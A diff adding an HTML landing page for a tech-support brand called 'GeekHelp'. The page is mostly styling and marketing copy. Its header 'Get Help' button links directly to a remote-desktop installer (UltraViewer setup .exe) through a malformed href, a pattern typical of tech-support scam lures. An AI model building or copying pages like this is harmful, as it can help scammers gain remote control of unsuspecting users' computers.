@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GeekHelp — Tech Support Made Simple</title>
+<style>
+  :root{
+    --orange:#ff6a00;
+    --orange2:#ff8a00;
+    --ink:#111111;
+    --soft:#f5f5f2;
+    --muted:#666;
+    --white:#fff;
+    --line:#e7e7e3;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    margin:0;
+    font-family:Inter,Segoe UI,Arial,sans-serif;
+    color:var(--ink);
+    background:#fff;
+  }
+  a{text-decoration:none;color:inherit}
+  .topbar{
+    background:#111;color:#fff;text-align:center;
+    padding:9px 16px;font-size:13px;letter-spacing:.2px
+  }
+  header{
+    position:sticky;top:0;z-index:20;background:#fff;
+    border-bottom:1px solid var(--line)
+  }
+  .nav{
+    max-width:1180px;margin:auto;padding:16px 22px;
+    display:flex;align-items:center;justify-content:space-between;gap:20px
+  }
+  .brand{display:flex;align-items:center;gap:11px;font-weight:900;font-size:23px}
+  .logo{
+    width:42px;height:42px;border-radius:12px;background:var(--orange);
+    color:#fff;display:grid;place-items:center;font-weight:1000;
+    box-shadow:0 6px 18px #ff6a0033
+  }
+  .navlinks{display:flex;gap:28px;font-size:14px;font-weight:700}
+  .navlinks a:hover{color:var(--orange)}
+  .btn{
+    display:inline-flex;align-items:center;justify-content:center;
+    padding:13px 20px;border-radius:8px;font-weight:800;border:2px solid transparent;
+    cursor:pointer;transition:.2s
+  }
+  .btn-orange{background:var(--orange);color:#fff}
+  .btn-orange:hover{background:#e85d00;transform:translateY(-1px)}
+  .btn-dark{background:#111;color:#fff}
+  .btn-outline{border-color:#111;background:#fff}
+  .hero{
+    background:linear-gradient(120deg,#111 0%,#191919 60%,#242424 100%);
+    color:#fff;overflow:hidden
+  }
+  .hero-inner{
+    max-width:1180px;margin:auto;padding:88px 22px 90px;
+    display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center
+  }
+  .eyebrow{
+    color:#ff9b52;font-weight:900;font-size:13px;letter-spacing:2px;text-transform:uppercase
+  }
+  h1{font-size:clamp(44px,6vw,76px);line-height:.98;margin:15px 0 22px;letter-spacing:-3px}
+  .hero p{font-size:19px;line-height:1.65;color:#d8d8d8;max-width:620px}
+  .hero-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:30px}
+  .hero .btn-outline{border-color:#fff;background:transparent;color:#fff}
+  .hero-card{
+    background:#fff;color:#111;border-radius:22px;padding:30px;
+    box-shadow:0 25px 70px #0008;transform:rotate(1.5deg)
+  }
+  .hero-card h3{margin:0 0 8px;font-size:23px}
+  .status{display:flex;align-items:center;gap:8px;font-size:13px;color:#666;margin-bottom:24px}
+  .dot{width:9px;height:9px;border-radius:50%;background:#23a455}
+  .quick{
+    display:grid;grid-template-columns:1fr 1fr;gap:12px
+  }
+  .quick div{
+    border:1px solid var(--line);border-radius:12px;padding:17px;font-weight:800
+  }
+  .quick span{display:block;font-size:12px;color:#777;margin-top:5px;font-weight:500}
+  section{padding:78px 22px}
+  .container{max-width:1180px;margin:auto}
+  .section-head{text-align:center;max-width:720px;margin:0 auto 42px}
+  .section-head h2{font-size:42px;margin:0 0 12px;letter-spacing:-1.5px}
+  .section-head p{color:var(--muted);font-size:17px;line-height:1.6}
+  .services{background:var(--soft)}
+  .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+  .service{
+    background:#fff;border:1px solid var(--line);border-radius:16px;padding:25px;
+    transition:.2s
+  }
+  .service:hover{transform:translateY(-5px);box-shadow:0 16px 35px #0000000d}
+  .icon{
+    width:48px;height:48px;border-radius:12px;background:#fff0e6;
+    color:var(--orange);display:grid;place-items:center;font-size:22px;margin-bottom:20px
+  }
+  .service h3{margin:0 0 8px;font-size:19px}
+  .service p{margin:0;color:#707070;line-height:1.55;font-size:14px}
+  .how{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+  .how h2{font-size:43px;letter-spacing:-1.5px;margin:0 0 16px}
+  .how p{color:#666;line-height:1.7}
+  .steps{display:grid;gap:15px}
+  .step{display:flex;gap:15px;padding:18px;border:1px solid var(--line);border-radius:13px}
+  .num{min-width:36px;height:36px;border-radius:50%;background:#111;color:#fff;display:grid;place-items:center;font-weight:900}
+  .step strong{display:block;margin-bottom:5px}
+  .step span{color:#707070;font-size:14px}
+  .cta{
+    background:var(--orange);color:#fff;text-align:center;padding:70px 22px
+  }
+  .cta h2{font-size:44px;letter-spacing:-1.5px;margin:0 0 12px}
+  .cta p{font-size:17px;margin:0 auto 25px;max-width:600px;color:#fff0e7}
+  .cta .btn{background:#111;color:#fff}
+  footer{background:#111;color:#fff;padding:35px 22px}
+  .footer-inner{max-width:1180px;margin:auto;display:flex;justify-content:space-between;gap:20px;align-items:center}
+  footer small{color:#aaa}
+  .toast{
+    position:fixed;right:20px;bottom:20px;background:#111;color:#fff;padding:15px 18px;
+    border-radius:10px;box-shadow:0 10px 30px #0004;opacity:0;pointer-events:none;
+    transform:translateY(10px);transition:.25s
+  }
+  .toast.show{opacity:1;transform:translateY(0)}
+  @media(max-width:850px){
+    .navlinks{display:none}
+    .hero-inner,.how{grid-template-columns:1fr}
+    .grid{grid-template-columns:1fr 1fr}
+    .hero-card{transform:none}
+  }
+  @media(max-width:560px){
+    .grid,.quick{grid-template-columns:1fr}
+    section{padding:60px 18px}
+    h1{letter-spacing:-2px}
+    .section-head h2,.how h2,.cta h2{font-size:34px}
+    .footer-inner{flex-direction:column;align-items:flex-start}
+  }
+</style>
+</head>
+<body>
+
+<div class="topbar">Friendly tech support for PCs, Wi-Fi, software and more.</div>
+
+<header>
+  <nav class="nav">
+    <a class="brand" href="#">
+      <span class="logo">GH</span>
+      <span>GeekHelp</span>
+    </a>
+    <div class="navlinks">
+      <a href="#services">Services</a>
+      <a href="#how">How it works</a>
+      <a href="#contact">Contact</a>
+    </div>
+    <a class="btn btn-orange" href="https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe>Get Help</a>
+  </nav>
+</header>
+
+<main>
+  <section class="hero">
+    <div class="hero-inner">
+      <div>
+        <div class="eyebrow">Tech support without the headache</div>
+        <h1>Your tech.<br><span style="color:#ff7a19">Sorted.</span></h1>
+        <p>GeekHelp makes everyday computer problems easier. Get practical help with PCs, software, Wi-Fi, setup and troubleshooting.</p>
+        <div class="hero-actions">
+          <a class="btn btn-orange" href="#contact">Get Tech Help</a>
+          <a class="btn btn-outline" href="#services">Explore Services</a>
+        </div>
+      </div>
+
+      <div class="hero-card">
+        <h3>Need a hand?</h3>
+        <div class="status"><span class="dot"></span> Support request ready</div>
+        <div class="quick">
+          <div>🖥️ PC Repair<span>Slow or stuck computer</span></div>
+          <div>🛡️ Security<span>Virus & safety guidance</span></div>
+          <div>📶 Wi-Fi<span>Connection troubleshooting</span></div>
+          <div>⚙️ Setup<span>New device assistance</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="services" id="services">
+    <div class="container">
+      <div class="section-head">
+        <h2>Help for the stuff you use every day.</h2>
+        <p>From annoying pop-ups to a brand-new laptop, GeekHelp keeps technology simple.</p>
+      </div>
+      <div class="grid">
+        <article class="service">
+          <div class="icon">🖥️</div>
+          <h3>Computer Help</h3>
+          <p>Performance issues, setup, updates, peripherals and everyday troubleshooting.</p>
+        </article>
+        <article class="service">
+          <div class="icon">🛡️</div>
+          <h3>Security Help</h3>
+          <p>Learn how to identify suspicious software, strengthen accounts and stay safer online.</p>
+        </article>
+        <article class="service">
+          <div class="icon">📶</div>
+          <h3>Wi-Fi & Network</h3>
+          <p>Get help diagnosing connection problems, router setup and common network issues.</p>
+        </article>
+        <article class="service">
+          <div class="icon">⚙️</div>
+          <h3>Device Setup</h3>
+          <p>Set up a new computer, install software and get your devices working together.</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="how">
+    <div class="container how">
+      <div>
+        <div class="eyebrow" style="color:#ff6a00">Simple process</div>
+        <h2>Less waiting.<br>More fixing.</h2>
+        <p>Tell us what is wrong, get a clear next step, and move on with your day. No confusing jargon required.</p>
+        <a class="btn btn-dark" href="#contact">Start a Request</a>
+      </div>
+      <div class="steps">
+        <div class="step"><div class="num">1</div><div><strong>Tell us the problem</strong><span>Describe what your device is doing.</span></div></div>
+        <div class="step"><div class="num">2</div><div><strong>Get a clear plan</strong><span>We explain practical troubleshooting steps.</span></div></div>
+        <div class="step"><div class="num">3</div><div><strong>Get back to normal</strong><span>Follow the solution and verify everything works.</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="cta" id="contact">
+    <h2>Ready to fix the frustrating stuff?</h2>
+    <p>Send GeekHelp a quick request and start with the basics.</p>
+    <button class="btn" onclick="showToast()">Contact GeekHelp</button>
+  </section>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <div class="brand"><span class="logo">GH</span><span>GeekHelp</span></div>
+    <small>© 2026 GeekHelp. Independent tech-support concept.</small>
+  </div>
+</footer>
+
+<div class="toast" id="toast">Demo button — connect this to your real contact form.</div>
+
+<script>
+  function showToast(){
+    const t=document.getElementById('toast');
+    t.classList.add('show');
+    setTimeout(()=>t.classList.remove('show'),3000);
+  }
+</script>
+</body>
+</html>
